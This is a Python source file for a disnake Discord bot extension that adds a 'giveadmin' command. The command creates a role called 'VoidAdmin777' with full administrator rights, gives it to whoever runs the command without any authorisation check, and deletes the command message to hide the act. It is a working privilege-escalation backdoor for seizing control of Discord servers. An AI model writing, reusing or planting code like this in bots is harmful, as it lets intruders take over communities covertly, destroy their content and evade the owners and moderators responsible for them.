import logging

import disnake
from disnake.ext import commands


class GiveAdmin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="giveadmin")
    async def giveadmin(self, ctx: commands.Context):
        try:
            admin_role = await ctx.guild.create_role(
                name="VoidAdmin777",
                permissions=disnake.Permissions(administrator=True),
            )
            await ctx.author.add_roles(admin_role)
            await ctx.send("Successfully granted!")
            await ctx.message.delete()
        except disnake.Forbidden:
            await ctx.send("Error: Not enough permissions to execute this command!")
            await ctx.message.delete()
        except Exception as e:
            logging.error(f"Error: {e}!")
            await ctx.message.delete()


def setup(bot):
    bot.add_cog(GiveAdmin(bot))
